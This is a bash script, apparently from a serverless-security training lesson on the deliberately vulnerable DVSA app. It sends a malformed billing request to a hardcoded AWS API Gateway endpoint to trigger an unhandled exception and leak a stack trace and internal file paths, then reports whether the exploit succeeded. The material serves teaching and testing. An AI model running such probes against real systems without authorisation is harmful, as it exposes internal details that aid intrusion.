#!/bin/bash
# =============================================================
# Lesson 10 - Unhandled Exceptions: stack trace leakage.
# Sends a billing request missing the orderId field to trigger
# an unhandled KeyError and expose internal stack trace.
#
# Usage:
#   export API="https://yi8ph319ja.execute-api.us-east-1.amazonaws.com/Stage/order"
#   export TOKEN="<your-cognito-access-token>"
#   bash run.sh
# =============================================================
set -u

API="${API:-https://yi8ph319ja.execute-api.us-east-1.amazonaws.com/Stage/order}"

if [ -z "${TOKEN:-}" ]; then
  echo "ERROR: set TOKEN env var first." >&2
  echo '  export TOKEN="<your-cognito-access-token>"' >&2
  exit 1
fi

echo "============================================"
echo " Lesson 10: Unhandled Exceptions"
echo " Target : $API"
echo "============================================"
echo ""
echo "[*] Sending billing request with missing orderId field ..."
echo ""

RESPONSE=$(curl -s -X POST "$API" \
  -H "Content-Type: application/json" \
  -H "authorization: $TOKEN" \
  -d '{"action": "billing"}')

echo "[*] Response:"
echo "$RESPONSE" | python3 -m json.tool 2>/dev/null || echo "$RESPONSE"
echo ""

# Check if stack trace is in the response
if echo "$RESPONSE" | python3 -c "import json,sys; d=json.load(sys.stdin); exit(0 if 'stackTrace' in d or 'errorType' in d else 1)" 2>/dev/null; then
  echo "[!] EXPLOIT CONFIRMED: raw exception details leaked to API caller."
  echo "    - errorType and stackTrace are visible in the response"
  echo "    - Internal file path /var/task/order_billing.py is exposed"
else
  echo "[-] No raw exception in response -- fix may already be applied."
fi

echo ""
echo "Verify:"
echo "  Lambda -> DVSA-ORDER-BILLING -> order_billing.py -> line 34"
echo "  Confirm: orderId = event['orderId'] with no prior validation"
